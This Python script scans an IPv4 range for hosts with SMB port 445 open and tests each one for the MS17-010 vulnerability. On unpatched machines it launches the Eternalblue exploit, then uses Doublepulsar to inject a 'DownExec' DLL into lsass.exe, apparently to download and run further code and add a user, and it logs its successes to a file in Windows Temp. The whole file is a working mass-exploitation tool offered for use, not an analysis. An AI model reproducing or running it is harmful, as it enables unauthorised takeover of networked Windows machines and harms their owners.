import ipaddress
import os.path
import socket
import subprocess
import sys
from struct import pack

from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from mysmb import MYSMB


def resource_path():
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path)


def main(remote_name):
    arh = ' ARH is not defined'
    try:
        conn = MYSMB(remote_name, '445')
    except:
        print('[-] The target is unavailable. May be Win10')
        print(remote_name, ' The target OS is unavailable. May be Win10', file=f)
        return
    username = ''
    password = ''
    try:
        conn.login(username, password)
    except:
        print('[-] Login failed: ')
        print(remote_name, ' Login failed', file=f)
        return
    finally:
        try:  # Get Arh
            stringBinding = r'ncacn_ip_tcp:%s[135]' % remote_name
            transport = DCERPCTransportFactory(stringBinding)
            transport.set_connect_timeout(2)
            dce = transport.get_dce_rpc()
            dce.connect()
            try:
                dce.bind(MSRPC_UUID_PORTMAP, transfer_syntax=('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0'))
            except DCERPCException as e:
                if str(e).find('syntaxes_not_supported') < 0:
                    pass
                else:
                    arh = 'x86'
                    dce.disconnect()
            else:
                arh = 'x64'
                dce.disconnect()
        except (Exception, KeyboardInterrupt) as e:
            pass
    print('[*] Target OS: ' + conn.get_server_os() + ' ' + arh)
    tid = conn.tree_connect_andx('\\\\' + remote_name + '\\' + 'IPC$')
    conn.set_default_tid(tid)
    TRANS_PEEK_NMPIPE = 0x23
    recvPkt = conn.send_trans(pack('<H', TRANS_PEEK_NMPIPE), maxParameterCount=0xffff, maxDataCount=0x800)
    status = recvPkt.getNTStatus()
    if status == 0xC0000205:  # STATUS_INSUFF_SERVER_RESOURCES
        print('[!] The target is NOT patched!!!')
        vuln_ip = 1
    else:
        print('[-] The target is patched')
        print('[*] Done --------------------------------------------------------------')
        vuln_ip = 0
    conn.disconnect_tree(tid)
    conn.logoff()
    conn.get_socket().close()

    if vuln_ip == 1:
        path = resource_path()
        eb_ok = subprocess.call(
            r'C:\Windows\System32\cmd.exe /c ' + path + '\\files\Eternalblue-2.2.0.exe --InConfig ' + path + '\\files\Eternalblue-2.2.0.xml --TargetIp ' + remote_name + ' --TargetPort 445 --OutConfig ' + path + '\\logs\EB_' + remote_name + '_445.txt --Target WIN72K8R2')
        if eb_ok == 0:
            print(remote_name, ' OK ', arh, file=f)
            dp_ok = subprocess.call(
                r'C:\Windows\System32\cmd.exe /c ' + path + '\\files\Doublepulsar-1.3.1.exe --InConfig ' + path + '\\files\Doublepulsar-1.3.1.xml --TargetIp ' + remote_name + ' --TargetPort 445 --OutConfig ' + path + '\\logs\DP_' + remote_name + '_445.txt --Protocol SMB --Architecture ' + arh + ' --Function RunDLL --DllPayload ' + path + '\\dlls\DownExec' + arh + '.dll --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine "" --NetworkTimeout 60')
            if dp_ok == 0:
                print(remote_name, 'AddUser OK ', file=f)
            else:
                print(remote_name, 'AddUser ----- ', file=f)
        else:
            print(remote_name, ' -----', file=f)
        print('[*] Done --------------------------------------------------------------')


f = open('C:\\Windows\\Temp\\check_log.txt', 'a')
if len(sys.argv) == 2:  # если аргумент не один, то на хуй
    for addr in ipaddress.IPv4Network(str(sys.argv[1])):  # ip or .0/24 etc
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(.5)
        try:
            result = sock.connect_ex((str(addr), 445))  # пинг 445 порта
        except KeyboardInterrupt:
            f.close()
            sys.exit()
        if result == 0:
            print(str(addr) + ' port OPEN  <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<')
            main(str(addr))  # если 445 открыт, то main
        else:
            print(str(addr) + ' ---')
        sock.close()
else:
    print('Huiniya, adres davay. Single ip or SIDR like 192.168.1.0\\24')
    sys.exit(0)
f.close()
print('FULL END')
